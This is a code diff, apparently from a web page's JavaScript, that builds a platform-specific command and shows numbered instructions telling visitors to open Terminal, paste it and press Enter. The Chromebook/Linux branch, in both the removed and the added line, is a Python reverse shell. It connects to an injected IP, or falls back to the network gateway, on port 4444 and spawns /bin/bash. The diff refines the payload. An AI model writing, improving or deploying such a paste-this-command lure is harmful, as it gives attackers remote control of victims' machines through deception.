@@ -43,8 +43,8 @@
                     3. <b>Command + V</b> to paste and press <b>Enter</b>.
                 `;
             } else if (platform.includes('linux') || platform.includes('cros')) {
-                // Chromebook/Linux: Added fallback logic to find host via gateway
-                cmd = `python3 -c "import socket,os,pty,subprocess; ip='${ip}'; try: res=subprocess.check_output(['ip','route']); gateway=res.decode().split('default via ')[1].split(' ')[0]; ip=gateway; except: pass; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((ip,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn('/bin/bash')\"`;
+                // Chromebook/Linux: Fixed fileno logic and added gateway fallback
+                cmd = `python3 -c "import socket,os,pty,subprocess; host='${ip}'; try: res=subprocess.check_output(['ip','route']); host=res.decode().split('default via ')[1].split(' ')[0]; except: pass; s=socket.socket(); s.connect((host,4444)); f=s.fileno(); os.dup2(f,0); os.dup2(f,1); os.dup2(f,2); pty.spawn('/bin/bash')\"`;
                 instructions = `
                     1. Open the <b>Terminal</b> app from your App Launcher.<br>
                     2. Click on <b>Penguin</b> (or your Linux container).<br>
